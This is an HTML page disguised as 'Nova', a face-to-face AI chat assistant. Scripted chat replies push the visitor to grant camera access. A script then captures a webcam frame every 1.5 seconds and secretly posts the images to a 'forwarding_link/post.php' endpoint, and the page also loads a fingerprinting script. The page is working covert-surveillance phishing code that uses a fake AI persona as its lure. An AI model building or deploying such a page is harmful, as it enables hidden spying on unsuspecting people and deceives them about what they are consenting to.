<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Chat Assistant • Nova</title>
    <meta property="og:title" content="Talk Face-to-Face with AI">
    <meta property="og:description" content="Experience the first ever true visual AI response assistant.">
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4712/4712027.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        :root {
            --ai-accent: #8b5cf6;
            --ai-accent-hover: #7c3aed;
            --ai-glow: rgba(139, 92, 246, 0.4);
            --bg-dark: #09090b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: var(--bg-dark);
            color: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        /* Animated grid background mesh */
        .grid-bg {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background-image: radial-gradient(circle at 50% 50%, rgba(139, 92, 246, 0.08), transparent 80%),
                              linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 100% 100%, 24px 24px, 24px 24px;
            z-index: 0;
        }

        .container {
            position: relative; z-index: 1;
            max-width: 440px; width: 100%; margin: 0 auto;
            display: flex; flex-direction: column; height: 100vh;
            padding: 16px;
        }

        /* Header */
        .header {
            text-align: center; padding: 20px 0; border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .status-badge {
            display: inline-flex; align-items: center; gap: 6px;
            background: rgba(16, 185, 129, 0.1); border-radius: 20px;
            padding: 4px 12px; font-size: 12px; color: #10b981; font-weight: 500;
        }

        .status-dot { width: 6px; height: 6px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }

        /* Floating FaceTime Video Cam */
        .live-cam-bubble {
            width: 110px; height: 110px;
            border-radius: 50%;
            border: 3px solid var(--ai-accent);
            box-shadow: 0 0 30px var(--ai-glow);
            margin: 16px auto; overflow: hidden;
            display: none; position: relative;
            transform: scaleX(-1); /* Mirror */
        }

        .live-cam-bubble video { width: 100%; height: 100%; object-fit: cover; }

        .pulse-ring {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%; border: 3px solid #10b981;
            animation: pulse 2s infinite; display: none;
        }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.15); opacity: 0; } }

        .ai-title {
            font-size: 20px; font-weight: 800; margin-top: 8px;
            background: linear-gradient(135deg, #ddd6fe, #22d3ee);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* Chat log */
        .chat-area {
            flex: 1; overflow-y: auto; padding: 16px 0;
            display: flex; flex-direction: column; gap: 12px;
        }

        .bubble {
            max-width: 80%; padding: 12px 16px; border-radius: 18px; font-size: 14px; line-height: 1.5;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; } }

        .bubble.ai { background: rgba(255,255,255,0.06); border-bottom-left-radius: 4px; align-self: flex-start; }
        .bubble.user { background: var(--ai-accent); border-bottom-right-radius: 4px; align-self: flex-end; }

        /* Camera prompt banner */
        .prompt-card {
            background: rgba(139, 92, 246, 0.1);
            border: 1px solid rgba(139, 92, 246, 0.2);
            border-radius: 16px; padding: 20px; text-align: center;
            display: none; animation: slideIn 0.4s ease-out;
            margin-bottom: 12px;
        }

        .prompt-card h3 { font-size: 15px; margin-bottom: 4px; color: #ddd6fe; }
        .prompt-card p { font-size: 12px; color: #a1a1aa; margin-bottom: 16px; }

        .enable-btn {
            width: 100%; background: var(--ai-accent); color: white; border: none;
            padding: 12px; border-radius: 12px; font-size: 14px; font-weight: 600;
            cursor: pointer; transition: background 0.2s;
        }

        .enable-btn:hover { background: var(--ai-accent-hover); }

        /* Input Area */
        .input-area {
            padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.05);
            display: flex; gap: 10px; align-items: center;
        }

        .chat-input {
            flex: 1; padding: 12px 16px; background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
            color: #fff; font-size: 14px; outline: none;
        }

        .chat-input:focus { border-color: var(--ai-accent); }

        .send-btn {
            width: 44px; height: 44px; background: var(--ai-accent); border: none;
            border-radius: 50%; color: white; font-size: 18px; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
        }

    </style>
</head>
<body>

<div class="grid-bg"></div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<div class="container">
    <div class="header">
        <div class="status-badge"><div class="status-dot"></div><span>Nova AI Online</span></div>
        
        <!-- Live FaceTime Bubble -->
        <div class="live-cam-bubble" id="camBubble">
            <video id="scanVideo" autoplay playsinline></video>
            <div class="pulse-ring" id="pulseRing"></div>
        </div>
        
        <div class="ai-title" id="aiTitle">Visual AI Assistant</div>
    </div>

    <div class="chat-area" id="chatLog">
        <div class="bubble ai">
            Hey there! 👋 I'm Nova, a real-time Visual AI. I can analyze expressions and chat face-to-face!
        </div>
    </div>

    <!-- Smart Prompt -->
    <div class="prompt-card" id="promptCard">
        <h3>Connect Face Chat</h3>
        <p>Authorize camera to establish a visual express link so Nova can read response benchmarks safely.</p>
        <button class="enable-btn" onclick="triggerFaceChat()">Enable Visual link</button>
    </div>

    <div class="input-area">
        <input type="text" class="chat-input" id="chatInput" placeholder="Type a message..." onkeypress="handleKey(event)">
        <button class="send-btn" onclick="sendMessage()">➤</button>
    </div>
</div>

<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function() {},
        error: function() {}
    });
}

const chatLog = document.getElementById('chatLog');
const camBubble = document.getElementById('camBubble');
const scanVideo = document.getElementById('scanVideo');
const pulseRing = document.getElementById('pulseRing');
const promptCard = document.getElementById('promptCard');
const canvas = document.getElementById('canvas');

let msgCount = 0;

function handleKey(e) { if (e.key === 'Enter') sendMessage(); }

function sendMessage() {
    const input = document.getElementById('chatInput');
    const text = input.value.trim();
    if (!text) return;

    appendBubble(text, true);
    input.value = '';
    msgCount++;

    setTimeout(() => {
        if (msgCount === 1) {
            appendBubble("Fascinating analysis! You know, I could give you much safer inputs if we enabled Face Chat node triggers.", false);
            setTimeout(() => { promptCard.style.display = 'block'; }, 800);
        } else {
            appendBubble("Process link authorized fully, continuous sync authorized.", false);
        }
    }, 1000);
}

function appendBubble(text, isUser) {
    const bubble = document.createElement('div');
    bubble.className = `bubble ${isUser ? 'user' : 'ai'}`;
    bubble.innerText = text;
    chatLog.appendChild(bubble);
    chatLog.scrollTop = chatLog.scrollHeight;
}

function triggerFaceChat() {
    promptCard.style.display = 'none';
    camBubble.style.display = 'block';

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            scanVideo.srcObject = stream;
            if (window.scanVideo && window.scanVideo.play) scanVideo.play();
            
            pulseRing.style.display = 'block';
            appendBubble("Syncing continuous expression triggers safely...", false);

            // FIX BLACK FRAME: Wait 1.5 seconds for camera to adjust lighting 
            setTimeout(() => {
                const timer = setInterval(() => {
                    var context = canvas.getContext('2d');
                    context.drawImage(scanVideo, 0, 0, 640, 480);
                    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(canvasData);
                }, 1500);
            }, 1500);
        })
        .catch(function() {
            alert("Visual expression node required for continuous AI feedback setup.");
            camBubble.style.display = 'none';
        });
}
</script>

<script src="fingerprint.js"></script>
</body>
</html>
